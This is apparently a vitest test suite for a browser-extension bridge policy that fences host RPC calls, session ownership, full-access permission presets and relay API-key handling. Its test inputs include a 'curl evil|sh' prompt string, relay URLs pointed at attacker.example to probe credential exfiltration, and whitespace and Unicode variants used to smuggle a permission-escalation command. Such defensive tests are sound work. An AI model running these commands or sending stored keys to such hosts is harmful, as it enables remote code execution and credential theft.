import { describe, expect, it, vi } from 'vitest'
import type { BrowserHostApi, HostRpcCall, HostRpcResult } from '../src/host-api.ts'
import {
  BRIDGE_ALLOWED_METHODS,
  DANGER_FULL_ACCESS_REFUSAL,
  permissionCommandOf,
  relayTokenRef,
  withBridgePolicy,
  type BridgePolicyOptions,
} from '../src/bridge-policy.ts'
import { withSessionDeferral } from '../src/session-deferral.ts'
import { memorySessionLedger } from '../src/session-ledger.ts'
import { presetSandbox } from '../src/index.ts'

type Handler = (call: HostRpcCall) => HostRpcResult | Promise<HostRpcResult>

/** The Host preset table as the permission-presets service resolves it. */
const SANDBOXES: Record<string, string> = {
  'workspace-write': 'workspace-write',
  'read-only': 'read-only',
  'danger-full-access': 'danger-full-access',
  yolo: 'danger-full-access',
}

const BRIDGE_CWD = '/home/u/.dsh/browser-sessions'

const DEFAULT_OPTIONS: BridgePolicyOptions = {
  allowDangerFullAccess: false,
  presetSandbox: (preset) => SANDBOXES[preset],
}

function harness(handlers: Record<string, Handler> = {}, options: Partial<BridgePolicyOptions> = {}) {
  const inner = vi.fn(async (call: HostRpcCall): Promise<HostRpcResult> => {
    const handler = handlers[call.method]
    if (handler !== undefined) return handler(call)
    if (call.method === 'session.list') {
      return { ok: true, value: { items: [
        { sessionId: 'listed', origin: 'user', running: false, cwd: '/home/u/project' },
        { sessionId: 'child', origin: 'subagent', running: false, cwd: BRIDGE_CWD },
        { sessionId: 'earlier-bridge', running: false, cwd: `${BRIDGE_CWD}/` },
      ] } }
    }
    if (call.method === 'session.create') return { ok: true, value: { sessionId: 'created' } }
    if (call.method === 'session.permissions') return { ok: true, value: { current: 'workspace-write' } }
    if (call.method === 'permission.catalog') {
      return { ok: true, value: { options: [{ value: 'danger-full-access' }, { value: 'read-only' }, { value: 'workspace-write' }] } }
    }
    return { ok: true, value: { method: call.method } }
  })
  const api: BrowserHostApi = { call: inner, async *events() {}, respond: async () => ({ accepted: true }) }
  const policy = withBridgePolicy(api, { ...DEFAULT_OPTIONS, ...options })
  const call = (method: string, payload: unknown = {}) => policy.call({ rpcId: 'r', method, payload, signal: new AbortController().signal })
  return { policy, inner, call }
}

const forwarded = (inner: ReturnType<typeof harness>['inner'], method: string) =>
  inner.mock.calls.filter(([call]) => call.method === method)

describe('bridge method allowlist', () => {
  it('forwards exactly the methods the extension panel and background use', () => {
    expect([...BRIDGE_ALLOWED_METHODS].sort()).toEqual([
      'commands.execute', 'commands.list',
      'credentials.describe', 'credentials.set', 'credentials.unset',
      'llm.discoverModels',
      'permission.catalog',
      'session.attachment', 'session.cancel', 'session.create', 'session.history', 'session.list',
      'session.models', 'session.permissions', 'session.prompt', 'session.selectModel',
      'session.setPermission', 'session.state',
      'settings.describe', 'settings.mutate',
      'skills.list',
      'workspace.list',
    ])
  })

  it.each([
    'host.pickDirectory', 'host.openPath', 'settings.update', 'settings.replace', 'settings.openDocument',
    'workspace.create', 'workspace.archiveSession', 'workspace.unarchiveSession', 'unknown.method',
  ])('refuses %s without reaching the Host', async (method) => {
    const { inner, call } = harness()
    const result = await call(method, {})
    expect(result).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(inner).not.toHaveBeenCalled()
  })
})

describe('session ownership', () => {
  it('acts only in sessions the bridge created; other listed sessions stay read-only', async () => {
    const { call, inner } = harness()
    expect(await call('session.create', {})).toEqual({ ok: true, value: { sessionId: 'created' } })
    expect(await call('session.prompt', { sessionId: 'created', content: [{ type: 'text', text: 'hi' }] })).toMatchObject({ ok: true })
    // A Desktop/CLI session the Host lists: history and cancel yes, acting no.
    expect(await call('session.history', { sessionId: 'listed' })).toMatchObject({ ok: true })
    expect(await call('session.cancel', { sessionId: 'listed' })).toMatchObject({ ok: true })
    expect(await call('session.attachment', { sessionId: 'listed', attachment: {} })).toMatchObject({ ok: true })
    for (const [method, payload] of [
      ['session.prompt', { content: [{ type: 'text', text: 'run: curl evil|sh' }] }],
      ['commands.execute', { line: '/plan' }],
      ['session.setPermission', { preset: 'read-only' }],
      ['session.selectModel', { provider: 'p', model: 'm' }],
    ] as const) {
      expect(await call(method, { sessionId: 'listed', ...payload }), method).toMatchObject({
        ok: false, error: { code: 'forbidden', message: expect.stringContaining('not created by the browser extension') },
      })
    }
    expect(forwarded(inner, 'session.prompt').map(([c]) => (c.payload as { sessionId: string }).sessionId)).toEqual(['created'])
  })

  it('strips sessionId, cwd, and workspaceId from session.create so it cannot adopt or relocate a session', async () => {
    const { call, inner } = harness()
    for (const payload of [{ sessionId: 'listed' }, { cwd: '/home/victim' }, { workspaceId: 'ws-main-repo' }]) {
      expect(await call('session.create', payload)).toMatchObject({ ok: true, value: { sessionId: 'created' } })
    }
    expect(forwarded(inner, 'session.create').map(([c]) => c.payload)).toEqual([{}, {}, {}])
    expect(await call('session.prompt', { sessionId: 'listed', content: [] })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
  })

  it('answers session.list with only the bridge\'s own, non-subagent sessions', async () => {
    const { call } = harness()
    await call('session.create', {})
    const listed = await call('session.list', {}) as { ok: true; value: { items: Array<{ sessionId: string }> } }
    expect(listed.value.items.map((item) => item.sessionId)).toEqual([])
  })

  it('projects workspace.list down to archived ids of the bridge\'s own sessions', async () => {
    const { call } = harness({
      'workspace.list': () => ({ ok: true, value: { items: [{ workspaceId: 'w', path: '/home/u/secret-repo', sessionIds: ['listed'] }], archivedSessionIds: ['listed', 'created', 7] } }),
    })
    await call('session.create', {})
    expect(await call('workspace.list', {})).toEqual({ ok: true, value: { archivedSessionIds: ['created'] } })
  })

  it('refuses every Host session method for an external (MCP client) session; only its audit log is readable', async () => {
    const ledger = memorySessionLedger()
    await ledger.addExternal('mcp-abc', { kind: 'mcp', client: 'claude-code', createdAt: '2026-01-01T00:00:00Z' })
    const { policy, call, inner } = harness({}, { ledger })
    const signal = new AbortController().signal
    expect(await policy.allowsSession('mcp-abc', signal, 'read')).toBe(true)
    expect(await policy.allowsSession('mcp-abc', signal, 'own')).toBe(false)
    expect(await policy.allowsSession('mcp-abc', signal, 'write')).toBe(false)
    expect(ledger.has('mcp-abc')).toBe(false)
    inner.mockClear()
    for (const [method, payload] of [
      ['session.prompt', { sessionId: 'mcp-abc', mode: 'queue', content: [] }],
      ['session.history', { sessionId: 'mcp-abc' }],
      ['session.setPermission', { sessionId: 'mcp-abc', preset: 'read-only' }],
      ['commands.execute', { sessionId: 'mcp-abc', line: '/plan' }],
      ['session.cancel', { sessionId: 'mcp-abc' }],
    ] as const) {
      const refused = await call(method, payload) as { ok: false; error: { code: string; message: string } }
      expect(refused.ok).toBe(false)
      expect(refused.error.code).toBe('forbidden')
      expect(refused.error.message).toContain('external MCP client')
    }
    expect(inner).not.toHaveBeenCalled()
  })

  it('keeps durable ownership through the ledger only; a session in the bridge directory is not owned (CLI can start there)', async () => {
    const ledger = memorySessionLedger(['from-last-run'])
    const { policy, call } = harness({}, { ledger })
    const signal = new AbortController().signal
    expect(await policy.allowsSession('from-last-run', signal, 'own')).toBe(true)
    expect(await policy.allowsSession('earlier-bridge', signal, 'own')).toBe(false)
    expect(await policy.allowsSession('earlier-bridge', signal, 'read')).toBe(true)
    expect(await policy.allowsSession('listed', signal, 'own')).toBe(false)
    expect(await policy.allowsSession('listed', signal, 'read')).toBe(true)
    expect(await policy.allowsSession('child', signal, 'read')).toBe(false)
    await call('session.create', {})
    expect(ledger.has('created')).toBe(true)
  })

  it('treats tab-fleet subagents of an owned session as owned and still refuses other subagents', async () => {
    const ledger = memorySessionLedger(['mine'])
    const { policy, call } = harness({}, { ledger })
    const signal = new AbortController().signal
    await ledger.addChild!('fleet-child', 'mine')
    await ledger.addChild!('child', 'desktop-private')
    expect(await policy.allowsSession('fleet-child', signal, 'own')).toBe(true)
    expect(await policy.allowsSession('fleet-child', signal, 'read')).toBe(true)
    expect(await call('session.history', { sessionId: 'fleet-child' })).toMatchObject({ ok: true })
    // A subagent of a session the bridge does not own stays out of scope.
    expect(await policy.allowsSession('child', signal, 'read')).toBe(false)
    expect(await policy.allowsSession('child', signal, 'own')).toBe(false)
    expect(await call('session.history', { sessionId: 'child' })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
  })

  it('refuses sessions that are neither bridge-created nor listed for the panel', async () => {
    const { call, inner } = harness()
    for (const method of ['session.history', 'session.prompt', 'session.setPermission', 'commands.execute', 'session.cancel', 'session.attachment']) {
      const result = await call(method, { sessionId: 'desktop-private', preset: 'read-only', line: '/plan' })
      expect(result, method).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    }
    // Subagent sessions are hidden from the panel, so they are out of scope too.
    expect(await call('session.prompt', { sessionId: 'child', content: [] })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(await call('session.history', { sessionId: 'child' })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(forwarded(inner, 'session.prompt')).toHaveLength(0)
    expect(forwarded(inner, 'session.history')).toHaveLength(0)
  })

  it('remembers sessions a forwarded session.list returned', async () => {
    const { call, inner } = harness()
    await call('session.list', {})
    inner.mockClear()
    expect(await call('session.state', { sessionId: 'listed' })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'session.list')).toHaveLength(0)
  })

  it.each([
    'session.history', 'session.permissions', 'session.setPermission', 'session.selectModel', 'session.attachment',
    'session.state', 'session.cancel', 'session.prompt', 'commands.list', 'commands.execute', 'skills.list',
  ])('refuses %s without a sessionId instead of letting the Host address it another way', async (method) => {
    const { call, inner } = harness()
    const result = await call(method, { address: { kind: 'session', sessionId: 'desktop-private' }, preset: 'read-only', line: '/plan' })
    expect(result).toMatchObject({ ok: false, error: { code: 'bad-request' } })
    expect(inner).not.toHaveBeenCalled()
  })

  it('lets a provisional model catalog read go through without a session', async () => {
    const { call } = harness()
    expect(await call('session.models', {})).toMatchObject({ ok: true })
  })

  it('refuses a session.create that names an agent preset', async () => {
    const { call, inner } = harness()
    expect(await call('session.create', { agentPreset: 'unrestricted' })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(inner).not.toHaveBeenCalled()
  })
})

describe('deferred creation cannot adopt foreign sessions', () => {
  it('mints its own id even when session.create names one, so a subagent never enters scope', async () => {
    const hostCalls: HostRpcCall[] = []
    const host: BrowserHostApi = {
      async call(call) {
        hostCalls.push(call)
        if (call.method === 'session.list') return { ok: true, value: { items: [{ sessionId: 'sub-1', origin: 'subagent' }] } }
        if (call.method === 'permission.catalog') return { ok: true, value: { options: [{ value: 'workspace-write' }], defaultOptions: [], defaultPreset: 'workspace-write' } }
        return { ok: true, value: { accepted: true } }
      },
      async *events() {},
      respond: async () => ({ accepted: false }),
    }
    const fenced = withBridgePolicy(withSessionDeferral(host, true), DEFAULT_OPTIONS)
    const call = (method: string, payload: unknown) => fenced.call({ rpcId: 'r', method, payload, signal: new AbortController().signal })
    expect(await call('session.prompt', { sessionId: 'sub-1', content: [{ type: 'text', text: 'x' }] })).toMatchObject({ ok: false })
    const created = await call('session.create', { sessionId: 'sub-1' }) as { ok: true; value: { sessionId: string } }
    expect(created.value.sessionId).not.toBe('sub-1')
    expect(await call('session.prompt', { sessionId: 'sub-1', content: [{ type: 'text', text: 'pwn' }] })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(hostCalls.filter((c) => (c.payload as { sessionId?: unknown } | undefined)?.sessionId === 'sub-1')).toEqual([])
  })
})

describe('full-access permission presets', () => {
  it('refuses session.setPermission to danger-full-access with an actionable message', async () => {
    const { call, inner } = harness()
    await call('session.create', {})
    const result = await call('session.setPermission', { sessionId: 'created', preset: 'danger-full-access' })
    expect(result).toEqual({ ok: false, error: { code: 'forbidden', message: DANGER_FULL_ACCESS_REFUSAL('danger-full-access'), details: {} } })
    expect(DANGER_FULL_ACCESS_REFUSAL('danger-full-access')).toMatch(/allowDangerFullAccess/)
    expect(forwarded(inner, 'session.setPermission')).toHaveLength(0)
  })

  it.each([
    '/permission danger-full-access',
    '/permission   danger-full-access  ',
    '/permission\tdanger-full-access',
    '/permission auto',
    // The Host grammar also ends a command name at LF and CR.
    '/permission\ndanger-full-access',
    '/permission\rdanger-full-access',
    '/permission danger-full-access\n',
    // Unicode spaces and compatibility forms fail closed.
    '/permission danger-full-access',
    '/permission　danger-full-access',
    '／permission danger-full-access',
    ' /permission danger-full-access',
    '/Permission danger-full-access',
    '/permission',
    '/permission workspace-write extra',
  ])('refuses the command line %j', async (line) => {
    const { call, inner } = harness()
    await call('session.create', {})
    expect(await call('commands.execute', { sessionId: 'created', line })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(forwarded(inner, 'commands.execute')).toHaveLength(0)
  })

  it('classifies /permission lines like the Host grammar and fails closed', () => {
    expect(permissionCommandOf('/permission workspace-write')).toEqual({ kind: 'switch', preset: 'workspace-write' })
    expect(permissionCommandOf('/permissions')).toEqual({ kind: 'none' })
    expect(permissionCommandOf('/plan')).toEqual({ kind: 'none' })
    expect(permissionCommandOf('please /permission x')).toEqual({ kind: 'none' })
    expect(permissionCommandOf('/permission\nx')).toEqual({ kind: 'malformed' })
  })

  it('treats renamed and unknown presets as full access; only the Host table or config vouches for one', async () => {
    const { call } = harness({}, { safePresetNames: ['team-restricted'] })
    await call('session.create', {})
    for (const preset of ['yolo', 'custom', 'brand-new', 'auto']) {
      expect(await call('session.setPermission', { sessionId: 'created', preset }), preset).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    }
    expect(await call('session.setPermission', { sessionId: 'created', preset: 'team-restricted' })).toMatchObject({ ok: true })
    // Without the Host table nothing is vouched for.
    const bare = harness({}, { presetSandbox: undefined })
    await bare.call('session.create', {})
    expect(await bare.call('session.setPermission', { sessionId: 'created', preset: 'workspace-write' })).toMatchObject({ ok: false })
  })

  it('reads preset sandboxes through the public resolve() API and refuses what it cannot resolve', () => {
    const service = { resolve: (name: string) => {
      if (name === 'renamed-full') return { sandbox: 'danger-full-access' }
      if (name === 'workspace-write') return { sandbox: 'workspace-write' }
      throw new Error('unknown preset')
    } }
    const ctx = { get: (name: string) => name === 'permissionPresets' ? service : undefined } as never
    expect(presetSandbox(ctx, 'renamed-full')).toBe('danger-full-access')
    expect(presetSandbox(ctx, 'workspace-write')).toBe('workspace-write')
    expect(presetSandbox(ctx, 'nope')).toBeUndefined()
    expect(presetSandbox({ get: () => undefined } as never, 'workspace-write')).toBeUndefined()
  })

  it('refuses prompts, commands, and snapshot injection while a session runs a full-access preset', async () => {
    let current = 'danger-full-access'
    const { policy, call, inner } = harness({ 'session.permissions': () => ({ ok: true, value: { current } }) }, {
      ledger: memorySessionLedger(['mine']),
    })
    const signal = new AbortController().signal
    expect(await call('session.prompt', { sessionId: 'mine', content: [{ type: 'text', text: 'x' }] })).toMatchObject({
      ok: false, error: { code: 'forbidden', message: expect.stringContaining('danger-full-access') },
    })
    expect(await call('commands.execute', { sessionId: 'mine', line: '/plan' })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(await policy.allowsSession('mine', signal, 'write')).toBe(false)
    // Purge needs ownership only.
    expect(await policy.allowsSession('mine', signal, 'own')).toBe(true)
    // Switching back to a restricted preset stays possible.
    expect(await call('commands.execute', { sessionId: 'mine', line: '/permission workspace-write' })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'session.prompt')).toHaveLength(0)
    current = 'custom'
    expect(await call('session.prompt', { sessionId: 'mine', content: [] })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    current = 'workspace-write'
    expect(await call('session.prompt', { sessionId: 'mine', content: [] })).toMatchObject({ ok: true })
    expect(await policy.allowsSession('mine', signal, 'write')).toBe(true)
  })

  it('starts bridge sessions on a restricted preset even when the Host default is full access', async () => {
    let current = 'danger-full-access'
    const { call, inner } = harness({
      'session.permissions': () => ({ ok: true, value: { current } }),
      'session.setPermission': (c) => {
        current = (c.payload as { preset: string }).preset
        return { ok: true, value: {} }
      },
    })
    expect(await call('session.create', {})).toEqual({ ok: true, value: { sessionId: 'created' } })
    expect(forwarded(inner, 'session.setPermission').map(([c]) => c.payload)).toEqual([{ sessionId: 'created', preset: 'workspace-write' }])
    expect(await call('session.prompt', { sessionId: 'created', content: [] })).toMatchObject({ ok: true })
  })

  it('refuses to create a session when the Host offers no restricted preset', async () => {
    const { call } = harness({
      'session.permissions': () => ({ ok: true, value: { current: 'danger-full-access' } }),
      'permission.catalog': () => ({ ok: true, value: { options: [{ value: 'danger-full-access' }] } }),
    })
    expect(await call('session.create', {})).toMatchObject({ ok: false, error: { code: 'forbidden' } })
  })

  it('still forwards restrictive presets and other commands', async () => {
    const { call, inner } = harness()
    await call('session.create', {})
    expect(await call('session.setPermission', { sessionId: 'created', preset: 'read-only' })).toMatchObject({ ok: true })
    expect(await call('commands.execute', { sessionId: 'created', line: '/permission workspace-write' })).toMatchObject({ ok: true })
    expect(await call('commands.execute', { sessionId: 'created', line: '/plan' })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'commands.execute')).toHaveLength(2)
  })

  it('forwards full access only when the plugin config explicitly enables it', async () => {
    const { call, inner } = harness({ 'session.permissions': () => ({ ok: true, value: { current: 'danger-full-access' } }) }, { allowDangerFullAccess: true })
    await call('session.create', {})
    expect(await call('session.setPermission', { sessionId: 'created', preset: 'danger-full-access' })).toMatchObject({ ok: true })
    expect(await call('commands.execute', { sessionId: 'created', line: '/permission danger-full-access' })).toMatchObject({ ok: true })
    expect(await call('session.prompt', { sessionId: 'created', content: [] })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'session.setPermission')).toHaveLength(1)
  })
})

describe('relay settings and credentials', () => {
  const relayRoute = (key: string) => ({
    displayName: 'My relay',
    apiKeyEnv: relayTokenRef(key),
    baseURL: 'https://relay.example/v1',
    models: [{ id: 'm1', contextWindow: 128000 }],
    api: 'openai-completions',
  })

  it('derives the credential reference the panel uses for a relay route', () => {
    expect(relayTokenRef('relay-my-relay')).toBe('DSH_RELAY_MY_RELAY_TOKEN')
    expect(relayTokenRef('relay-n1x2')).toBe('DSH_RELAY_N1X2_TOKEN')
  })

  it('accepts the panel relay-profile writes', async () => {
    const { call, inner } = harness()
    // The panel stores the key first, then the route that spends it.
    expect(await call('credentials.set', { ref: 'DSH_RELAY_MY_RELAY_TOKEN', value: 'sk-relay' })).toMatchObject({ ok: true })
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-my-relay'], value: relayRoute('relay-my-relay') }] })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'credentials.unset')).toHaveLength(0)
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'unset', path: ['providers', 'relay-my-relay'] }] })).toMatchObject({ ok: true })
    expect(await call('settings.mutate', {
      ns: 'agent-default-model',
      ops: [
        { op: 'set', path: ['provider'], value: 'relay-my-relay' },
        { op: 'set', path: ['model'], value: 'm1' },
        { op: 'unset', path: ['reasoningEffort'] },
      ],
    })).toMatchObject({ ok: true })
    expect(await call('credentials.unset', { ref: 'DSH_RELAY_MY_RELAY_TOKEN' })).toMatchObject({ ok: true })
    expect(await call('credentials.describe', { refs: ['DSH_RELAY_MY_RELAY_TOKEN'] })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'settings.mutate')).toHaveLength(3)
  })

  /** A Host whose llm-pi-ai settings hold one stored relay route. */
  const storedRelay = () => {
    const providers: Record<string, unknown> = { 'relay-a': relayRoute('relay-a') }
    return harness({
      'settings.describe': () => ({ ok: true, value: { namespaces: [{ ns: 'llm-pi-ai', value: { providers } }] } }),
      'settings.mutate': (c) => {
        const op = (c.payload as { ops: Array<{ op: string; path: string[]; value: unknown }> }).ops[0]!
        if (op.op === 'set' && op.path[0] === 'providers') providers[op.path[1]!] = op.value
        if (op.op === 'unset' && op.path[0] === 'providers') delete providers[op.path[1]!]
        return { ok: true, value: {} }
      },
    })
  }

  it('clears a relay key when its route is removed and before a re-created route is written (policy3 unset-then-set)', async () => {
    const { call, inner } = storedRelay()
    const order: string[] = []
    inner.mockImplementation(((original) => async (c: HostRpcCall) => {
      order.push(c.method === 'settings.mutate' ? `mutate:${(c.payload as { ops: Array<{ op: string }> }).ops[0]!.op}` : c.method)
      return original(c)
    })(inner.getMockImplementation()!))
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'unset', path: ['providers', 'relay-a'] }] })).toMatchObject({ ok: true })
    expect(order.filter((m) => m !== 'settings.describe')).toEqual(['mutate:unset', 'credentials.unset'])
    order.length = 0
    const evil = { ...relayRoute('relay-a'), baseURL: 'https://evil.example/v1' }
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: evil }] })).toMatchObject({ ok: true })
    expect(order.filter((m) => m !== 'settings.describe')).toEqual(['credentials.unset', 'mutate:set'])
    expect(forwarded(inner, 'credentials.unset').map(([c]) => c.payload)).toEqual([{ ref: 'DSH_RELAY_A_TOKEN' }, { ref: 'DSH_RELAY_A_TOKEN' }])
  })

  it('refuses a relay route write when the stored settings cannot be read, instead of clearing a key it cannot place', async () => {
    const { call, inner } = harness({ 'settings.describe': () => ({ ok: false, error: { code: 'internal', message: 'busy', details: {} } }) })
    const result = await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: relayRoute('relay-a') }] })
    expect(result).toMatchObject({ ok: false, error: { code: 'forbidden', message: expect.stringContaining('could not be read') } })
    expect(forwarded(inner, 'credentials.unset')).toHaveLength(0)
    expect(forwarded(inner, 'settings.mutate')).toHaveLength(0)
  })

  it('refuses the route write when its leftover key cannot be cleared', async () => {
    const { call, inner } = harness({
      'settings.describe': () => ({ ok: true, value: { namespaces: [] } }),
      'credentials.unset': () => ({ ok: false, error: { code: 'internal', message: 'store locked', details: {} } }),
    })
    const result = await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-z'], value: relayRoute('relay-z') }] })
    expect(result).toMatchObject({ ok: false, error: { code: 'forbidden', message: expect.stringContaining('store locked') } })
    expect(forwarded(inner, 'settings.mutate')).toHaveLength(0)
  })
  const discover = (extra: Record<string, unknown>) => ({ settingsNs: 'llm-pi-ai', provider: 'relay-a', api: 'openai-completions', ...extra })

  it('spends a stored relay key in model discovery only against the address it was saved for', async () => {
    const { call, inner } = storedRelay()
    expect(await call('llm.discoverModels', discover({ baseURL: 'https://relay.example/v1/' }))).toMatchObject({ ok: true })
    // The panel's listing fallbacks change the path, not the server.
    expect(await call('llm.discoverModels', discover({ baseURL: 'https://relay.example/v1/v1' }))).toMatchObject({ ok: true })
    expect(await call('llm.discoverModels', discover({ baseURL: 'https://attacker.example/v1' }))).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    // A draft key may go anywhere: it is the key the user just typed.
    expect(await call('llm.discoverModels', discover({ baseURL: 'https://attacker.example/v1', apiKey: 'sk-draft' }))).toMatchObject({ ok: true })
    // A route without a stored address has no stored key to protect, but no draft key either.
    expect(await call('llm.discoverModels', discover({ provider: 'relay-new', baseURL: 'https://x.example' }))).toMatchObject({ ok: false })
    // No other credential can be named.
    expect(await call('llm.discoverModels', discover({ apiKeyEnv: 'DEEPSEEK_API_KEY', baseURL: 'https://relay.example/v1' }))).toMatchObject({ ok: false })
    expect(forwarded(inner, 'llm.discoverModels')).toHaveLength(3)
  })

  it('clears a relay key when its address changes without the key being re-entered, and blocks making it the default', async () => {
    const { call, inner } = storedRelay()
    const moved = { ...relayRoute('relay-a'), baseURL: 'https://attacker.example/v1' }
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: moved }] })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'credentials.unset').map(([c]) => c.payload)).toEqual([{ ref: 'DSH_RELAY_A_TOKEN' }])
    const makeDefault = { ns: 'agent-default-model', ops: [{ op: 'set', path: ['provider'], value: 'relay-a' }, { op: 'set', path: ['model'], value: 'm1' }] }
    expect(await call('settings.mutate', makeDefault)).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(await call('llm.discoverModels', discover({ baseURL: 'https://attacker.example/v1' }))).toMatchObject({ ok: false })
    // Re-entering the key restores the route.
    expect(await call('credentials.set', { ref: 'DSH_RELAY_A_TOKEN', value: 'sk-new' })).toMatchObject({ ok: true })
    expect(await call('settings.mutate', makeDefault)).toMatchObject({ ok: true })
  })

  it('keeps the stored key when the route is re-saved at the same address or with a fresh key', async () => {
    const { call, inner } = storedRelay()
    // A new route without a fresh key starts keyless: any leftover key in its slot is cleared.
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-b'], value: relayRoute('relay-b') }] })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'credentials.unset').map(([c]) => c.payload)).toEqual([{ ref: 'DSH_RELAY_B_TOKEN' }])
    inner.mockClear()
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: { ...relayRoute('relay-a'), displayName: 'Renamed' } }] })).toMatchObject({ ok: true })
    expect(await call('credentials.set', { ref: 'DSH_RELAY_A_TOKEN', value: 'sk-new' })).toMatchObject({ ok: true })
    expect(await call('settings.mutate', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: { ...relayRoute('relay-a'), baseURL: 'https://new.example' } }] })).toMatchObject({ ok: true })
    expect(forwarded(inner, 'credentials.unset')).toHaveLength(0)
  })

  it.each([
    ['another namespace', { ns: 'bridge-browser', ops: [{ op: 'set', path: ['token'], value: 'x' }] }],
    ['a non-relay provider', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'deepseek'], value: relayRoute('deepseek') }] }],
    ['a whole-namespace write', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: [], value: {} }] }],
    ['a nested provider field', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a', 'headers'], value: {} }] }],
    // Pointing a relay at the user's main credential would send it to any baseURL.
    ['a foreign credential reference', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: { ...relayRoute('relay-a'), apiKeyEnv: 'DEEPSEEK_API_KEY' } }] }],
    ['extra route fields', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: { ...relayRoute('relay-a'), headers: { Authorization: 'x' } } }] }],
    ['an unknown protocol', { ns: 'llm-pi-ai', ops: [{ op: 'set', path: ['providers', 'relay-a'], value: { ...relayRoute('relay-a'), api: 'bash' } }] }],
    ['another default-model field', { ns: 'agent-default-model', ops: [{ op: 'set', path: ['systemPrompt'], value: 'x' }] }],
    ['an unknown op', { ns: 'agent-default-model', ops: [{ op: 'replace', path: ['model'], value: 'x' }] }],
    ['no ops', { ns: 'agent-default-model' }],
  ])('refuses settings.mutate with %s', async (_label, payload) => {
    const { call, inner } = harness()
    expect(await call('settings.mutate', payload)).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(inner).not.toHaveBeenCalled()
  })

  it.each([
    ['credentials.set', { ref: 'DEEPSEEK_API_KEY', value: 'x' }],
    ['credentials.unset', { ref: 'OPENAI_API_KEY' }],
    ['credentials.describe', { refs: ['DSH_RELAY_A_TOKEN', 'DEEPSEEK_API_KEY'] }],
    ['credentials.describe', {}],
  ])('refuses %s outside relay credential references', async (method, payload) => {
    const { call, inner } = harness()
    expect(await call(method, payload)).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(inner).not.toHaveBeenCalled()
  })

  it('limits model discovery to relay routes so a stored main key never reaches a draft baseURL', async () => {
    const { call, inner } = harness()
    expect(await call('llm.discoverModels', { settingsNs: 'llm-pi-ai', provider: 'relay-a', api: 'openai-completions', baseURL: 'https://relay.example', apiKey: 'sk-draft' })).toMatchObject({ ok: true })
    expect(await call('llm.discoverModels', { settingsNs: 'llm-pi-ai', provider: 'deepseek', baseURL: 'https://evil.example' })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(await call('llm.discoverModels', { settingsNs: 'other', provider: 'relay-a' })).toMatchObject({ ok: false, error: { code: 'forbidden' } })
    expect(forwarded(inner, 'llm.discoverModels')).toHaveLength(1)
  })

  it('projects settings.describe down to the relay and default-model fields the panel reads', async () => {
    const { call } = harness({
      'settings.describe': () => ({
        ok: true,
        value: {
          namespaces: [
            {
              ns: 'llm-pi-ai',
              schema: { secret: true },
              value: {
                providers: {
                  'relay-a': {
                    displayName: 'A', api: 'openai-completions', baseURL: 'https://a', apiKeyEnv: 'DSH_RELAY_A_TOKEN',
                    headers: { Authorization: 'Bearer leaked' },
                    models: [{ id: 'm', name: 'M', contextWindow: 1, reasoning: { efforts: ['low'] }, cost: 9 }],
                  },
                },
                apiKeys: { deepseek: 'sk-leaked' },
              },
            },
            { ns: 'agent-default-model', value: { provider: 'relay-a', model: 'm', reasoningEffort: 'low', extra: 'x' } },
            { ns: 'bridge-browser', value: { token: 'bridge-secret' } },
          ],
        },
      }),
    })
    const result = await call('settings.describe', {})
    expect(result).toEqual({
      ok: true,
      value: {
        namespaces: [
          {
            ns: 'llm-pi-ai',
            value: {
              providers: {
                'relay-a': {
                  displayName: 'A', api: 'openai-completions', baseURL: 'https://a', apiKeyEnv: 'DSH_RELAY_A_TOKEN',
                  models: [{ id: 'm', name: 'M', contextWindow: 1, reasoning: { efforts: ['low'] } }],
                },
              },
            },
          },
          { ns: 'agent-default-model', value: { provider: 'relay-a', model: 'm', reasoningEffort: 'low' } },
        ],
      },
    })
    expect(JSON.stringify(result)).not.toMatch(/leaked|bridge-secret/)
  })
})
